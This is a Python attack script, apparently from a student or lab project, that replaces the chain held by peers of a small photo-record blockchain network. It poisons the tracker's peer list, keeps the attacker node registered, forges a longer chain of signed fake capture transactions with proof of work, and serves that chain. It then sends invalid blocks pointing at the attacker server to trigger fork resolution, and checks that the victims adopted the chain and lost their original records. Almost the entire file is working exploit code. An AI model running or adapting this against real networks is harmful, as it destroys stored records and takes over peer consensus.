#!/usr/bin/env python3
"""
Attack: Full Chain Replacement (Tracker Poisoning + Signed Forged Chain)

Complete attack flow that was verified to work against 3 live peer nodes:
  Step 1 — Recon: discover Tracker and all peers, get chain heights
  Step 2 — Tracker poisoning: register our malicious node into the peer list
  Step 3 — Forge chain: build a longer chain with properly ECDSA-signed transactions
  Step 4 — Serve & trigger: host the forged chain, send invalid blocks to all peers
            to trigger fork-resolution, which pulls and replaces with our chain
  Step 5 — Verify: confirm all victims adopted our forged chain

Usage:
  python attack_fake_chain.py \
    --tracker http://10.206.134.178:50000 \
    --attacker-ip 10.206.116.8 \
    --serve-port 9997 \
    --blocks 30
"""

import argparse
import hashlib
import logging
import sys
import os
import threading
import time

import requests
from flask import Flask, jsonify

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from blockchain.block import Block
from blockchain.transaction import Transaction
from application.crypto_utils import generate_keypair, sign
from config import (
    GENESIS_HASH, DIFFICULTY_BITS, TX_CAPTURE,
    HEARTBEAT_INTERVAL,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [ATTACK] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ── Step 1: Recon ────────────────────────────────────────────────────────────

def recon(tracker_url: str) -> tuple[list[str], dict[str, int]]:
    """Discover all peers via the Tracker and probe their chain heights.

    Returns (peer_urls, {peer_url: chain_height}).
    Peer URLs are rewritten to use the Tracker's host IP so they are
    reachable from the attacker machine (peers often register as 127.0.0.1).
    """
    log.info("Step 1 — Recon: contacting Tracker at %s", tracker_url)

    resp = requests.get(f"{tracker_url}/health", timeout=5)
    health = resp.json()
    log.info("  Tracker health: %s", health)

    resp = requests.get(f"{tracker_url}/peers", timeout=5)
    raw_peers = resp.json().get("peers", [])
    log.info("  Raw peer list: %s", raw_peers)

    tracker_host = tracker_url.split("//")[1].split(":")[0]

    peers = []
    for p in raw_peers:
        rewritten = p.replace("127.0.0.1", tracker_host).replace("localhost", tracker_host)
        peers.append(rewritten)

    heights: dict[str, int] = {}
    for peer in peers:
        try:
            resp = requests.get(f"{peer}/api/blocks", timeout=5)
            chain = resp.json().get("chain", [])
            heights[peer] = len(chain)
            log.info("  %s — chain height: %d", peer, len(chain))
        except Exception as e:
            log.warning("  %s — unreachable: %s", peer, e)

    return peers, heights


# ── Step 2: Tracker Poisoning ────────────────────────────────────────────────

def poison_tracker(tracker_url: str, attacker_url: str) -> bool:
    """Register our malicious node with the Tracker."""
    log.info("Step 2 — Tracker poisoning: registering %s", attacker_url)

    resp = requests.post(
        f"{tracker_url}/register",
        json={"url": attacker_url},
        timeout=5,
    )
    log.info("  Registration response: %s %s", resp.status_code, resp.json())

    resp = requests.get(f"{tracker_url}/peers", timeout=5)
    peers = resp.json().get("peers", [])
    found = attacker_url in peers
    log.info("  In peer list: %s  (peers: %s)", found, peers)
    return found


def tracker_heartbeat_loop(tracker_url: str, attacker_url: str, stop: threading.Event):
    """Background thread: keep re-registering so the Tracker doesn't prune us."""
    while not stop.is_set():
        try:
            requests.post(f"{tracker_url}/register", json={"url": attacker_url}, timeout=5)
        except Exception:
            pass
        stop.wait(HEARTBEAT_INTERVAL // 2)


# ── Step 3: Forge a Signed Chain ─────────────────────────────────────────────

def forge_signed_chain(
    num_blocks: int,
    privkey: str,
    pubkey: str,
) -> list[Block]:
    """Build a valid chain from genesis with ECDSA-signed CAPTURE transactions."""
    log.info("Step 3 — Forging %d blocks with signed transactions...", num_blocks)
    start = time.time()

    genesis = Block(
        index=0,
        previous_hash=GENESIS_HASH,
        transactions=[],
        timestamp=0.0,
        nonce=0,
        miner="genesis",
    )
    chain = [genesis]
    prefix = DIFFICULTY_BITS // 4
    device_id = hashlib.sha256(pubkey.encode()).hexdigest()[:32]

    for i in range(1, num_blocks + 1):
        prev = chain[-1]
        coinbase = Transaction.make_coinbase(pubkey)

        fake_capture = Transaction(
            tx_type=TX_CAPTURE,
            sender=pubkey,
            payload={
                "device_id": device_id,
                "image_hash": hashlib.sha256(f"tampered-photo-{i}".encode()).hexdigest(),
                "phash": "0" * 16,
                "location": "attacker-lab",
            },
            timestamp=time.time(),
        )
        fake_capture.signature = sign(privkey, fake_capture.signable_bytes())

        candidate = Block(
            index=i,
            previous_hash=prev.hash,
            transactions=[coinbase, fake_capture],
            timestamp=time.time(),
            nonce=0,
            miner=pubkey,
        )

        nonce = 0
        while True:
            candidate.nonce = nonce
            candidate.hash = candidate.compute_hash()
            if candidate.hash.startswith("0" * prefix):
                break
            nonce += 1

        chain.append(candidate)

    elapsed = time.time() - start
    log.info("  Forged %d blocks in %.3fs", num_blocks, elapsed)
    log.info("  Chain tip: block #%d, hash=%s...", chain[-1].index, chain[-1].hash[:16])
    return chain


# ── Step 4: Serve Forged Chain & Trigger Replacement ─────────────────────────

def start_chain_server(chain: list[Block], port: int) -> threading.Thread:
    """Start a Flask server that serves the forged chain in a background thread."""
    app = Flask(__name__)
    app.logger.setLevel(logging.WARNING)
    chain_data = [blk.to_dict() for blk in chain]

    @app.route("/api/blocks", methods=["GET"])
    def get_blocks():
        return jsonify({"chain": chain_data}), 200

    @app.route("/api/health", methods=["GET"])
    def health():
        return jsonify({"status": "ok"}), 200

    @app.route("/api/peers", methods=["GET"])
    def get_peers():
        return jsonify({"peers": []}), 200

    @app.route("/api/transaction", methods=["POST"])
    def recv_tx():
        return jsonify({"status": "ok"}), 200

    @app.route("/api/block", methods=["POST"])
    def recv_block():
        return jsonify({"status": "ok", "appended": False}), 200

    thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=port, debug=False),
        daemon=True,
    )
    thread.start()
    time.sleep(1)
    return thread


def trigger_replacement(peers: list[str], attacker_serve_url: str, pubkey: str):
    """Send a deliberately invalid block to each peer to trigger fork-resolution."""
    log.info("Step 4 — Triggering chain replacement on %d peers...", len(peers))

    trigger = Block(
        index=999,
        previous_hash="0" * 64,
        transactions=[Transaction.make_coinbase(pubkey)],
        timestamp=time.time(),
        nonce=0,
        miner=pubkey,
    )

    for peer in peers:
        msg_id = hashlib.sha256(f"attack-{peer}-{time.time()}".encode()).hexdigest()[:16]
        payload = {
            "block": trigger.to_dict(),
            "ttl": 0,
            "msg_id": msg_id,
            "sender_url": attacker_serve_url,
        }
        try:
            resp = requests.post(f"{peer}/api/block", json=payload, timeout=10)
            log.info("  %s → %s", peer, resp.json())
        except Exception as e:
            log.warning("  %s → ERROR: %s", peer, e)


# ── Step 5: Verify ───────────────────────────────────────────────────────────

def verify_attack(peers: list[str], expected_height: int, attacker_pubkey: str) -> bool:
    """Check whether victims adopted the forged chain."""
    log.info("Step 5 — Verifying attack results...")
    time.sleep(3)

    all_success = True
    for peer in peers:
        try:
            resp = requests.get(f"{peer}/api/blocks", timeout=5)
            chain = resp.json().get("chain", [])
            height = len(chain)
            miner = chain[-1].get("miner", "?") if chain else "?"
            is_ours = miner == attacker_pubkey

            if height >= expected_height and is_ours:
                log.info("  %s — SUCCESS  height=%d, miner=%s... (ours)", peer, height, miner[:20])
            else:
                log.info("  %s — FAILED   height=%d, miner=%s...", peer, height, miner[:20])
                all_success = False
        except Exception as e:
            log.warning("  %s — ERROR: %s", peer, e)
            all_success = False

    return all_success


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Full chain replacement attack: tracker poisoning + signed forged chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  python attack_fake_chain.py \\
    --tracker http://10.206.134.178:50000 \\
    --attacker-ip 10.206.116.8 \\
    --serve-port 9997 \\
    --blocks 30
        """,
    )
    parser.add_argument("--tracker", required=True,
                        help="Victim's Tracker URL (e.g. http://10.206.134.178:50000)")
    parser.add_argument("--attacker-ip", required=True,
                        help="Attacker's IP reachable by victim (e.g. 10.206.116.8)")
    parser.add_argument("--serve-port", type=int, default=9997,
                        help="Port to serve the forged chain (default: 9997)")
    parser.add_argument("--blocks", type=int, default=30,
                        help="Number of blocks to forge (default: 30)")
    args = parser.parse_args()

    attacker_url = f"http://{args.attacker_ip}:{args.serve_port}"
    stop_event = threading.Event()

    # ── Step 1: Recon ────────────────────────────────────────
    try:
        peers, heights = recon(args.tracker)
    except Exception as e:
        log.error("Recon failed: %s", e)
        return 1

    if not peers:
        log.error("No peers found. Is the target running?")
        return 1

    max_height = max(heights.values()) if heights else 1
    forge_count = max(args.blocks, max_height + 5)

    # ── Step 2: Tracker Poisoning ────────────────────────────
    try:
        poison_tracker(args.tracker, attacker_url)
    except Exception as e:
        log.warning("Tracker poisoning failed: %s (continuing anyway)", e)

    hb_thread = threading.Thread(
        target=tracker_heartbeat_loop,
        args=(args.tracker, attacker_url, stop_event),
        daemon=True,
    )
    hb_thread.start()

    # ── Step 3: Forge Signed Chain ───────────────────────────
    privkey, pubkey = generate_keypair()
    log.info("  Attacker pubkey: %s...", pubkey[:32])

    forged_chain = forge_signed_chain(forge_count, privkey, pubkey)

    # ── Step 4: Serve & Trigger ──────────────────────────────
    log.info("Starting forged chain server on :%d ...", args.serve_port)
    start_chain_server(forged_chain, args.serve_port)

    reachable_peers = [p for p in peers if p in heights]
    trigger_replacement(reachable_peers, attacker_url, pubkey)

    # ── Step 5: Verify ───────────────────────────────────────
    # expected height = forge_count + 1 (genesis + forged blocks)
    success = verify_attack(reachable_peers, forge_count + 1, pubkey)

    if success:
        log.info("=" * 60)
        log.info("ATTACK SUCCESSFUL — all %d peers compromised", len(reachable_peers))
        log.info("  Forged chain height: %d", forge_count + 1)
        log.info("  Original max height: %d", max_height)
        log.info("  All original photo records have been erased.")
        log.info("=" * 60)
    else:
        log.warning("Attack partially or fully failed. Check output above.")

    log.info("Forged chain server still running. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        log.info("Stopped.")

    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
